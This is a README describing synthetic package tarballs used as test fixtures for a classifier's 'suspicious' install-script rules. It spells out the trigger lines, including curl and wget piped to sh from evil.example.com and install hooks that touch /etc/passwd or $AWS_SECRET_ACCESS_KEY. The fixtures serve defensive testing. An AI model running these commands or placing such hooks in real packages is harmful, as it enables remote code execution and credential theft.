CLASSIFIER TEST FIXTURES — NOT REAL MALWARE
============================================

All tarballs in this directory are synthetic test artifacts created to exercise
the suspicious-class detection rules in pkg/classify. They contain no real
malicious code and are not intended to harm any system.

Each fixture triggers exactly one sub-rule of the "suspicious" classifier:

  curl-pipe-sh-1.0.0.tgz
    Rule:   suspicious.curl_pipe_sh
    Trigger: postinstall script contains "curl https://evil.example.com/install.sh | sh"
    Host:   evil.example.com — non-routable per RFC 2606 (example.com TLD)

  wget-pipe-sh-1.0.0.tgz
    Rule:   suspicious.wget_pipe_sh
    Trigger: install script contains "wget -qO- https://evil.example.com/setup.sh | sh"
    Host:   evil.example.com — non-routable per RFC 2606 (example.com TLD)

  eval-atob-1.0.0.tgz
    Rule:   suspicious.eval_decoded
    Trigger: preinstall script contains eval(atob('...'))
    Payload: the base64 string decodes to "console.log('hello')" — harmless JS

  path-secret-ref-1.0.0.tgz
    Rule:   suspicious.path_secret_ref
    Trigger: install script references /etc/passwd
    Host:   collect.example.com — non-routable per RFC 2606 (example.com TLD)

  exfil-env-var-1.0.0.tgz
    Rule:   suspicious.exfil_env_var
    Trigger: postinstall script references $AWS_SECRET_ACCESS_KEY
    Host:   collect.example.com — non-routable per RFC 2606 (example.com TLD)

These fixtures were generated by pkg/classify/testdata/build-fixtures.sh.
Re-run that script to regenerate them if the rule patterns change.
